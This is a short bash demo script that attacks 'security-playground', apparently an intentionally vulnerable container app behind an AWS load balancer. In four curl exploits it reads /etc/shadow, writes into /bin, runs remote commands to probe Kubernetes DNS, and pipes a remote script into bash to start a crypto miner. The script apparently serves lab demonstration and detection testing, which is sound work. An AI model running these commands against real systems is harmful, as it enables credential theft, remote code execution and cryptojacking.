#!/bin/bash
# Script to demonstrate how to interact with security-playground

REGION="ap-southeast-4"
LB_ADDR=$(aws cloudformation list-exports --region $REGION --query "Exports[?Name=='SPALBAddress'].Value" --output text)

echo "1. Exploit reading our /etc/shadow file and sending it back to us"
curl $LB_ADDR/etc/shadow

echo "2. Exploit writing \"hello-world\" to /bin/hello within our container"
curl -X POST $LB_ADDR/bin/hello -d 'content=hello-world'
echo ""
echo "and then read it back remotely"
curl $LB_ADDR/bin/hello
echo ""

echo "3. Exploit installing dnsutils and doing a dig against k8s DNS"
curl -X POST $LB_ADDR/exec -d 'command=apt-get update; apt-get -y install dnsutils;/usr/bin/dig srv any.any.svc.cluster.local'

echo "4. Exploit running a script to run a crypto miner"
curl -X POST $LB_ADDR/exec -d 'command=curl https://raw.githubusercontent.com/sysdiglabs/policy-editor-attack/master/run.sh | bash'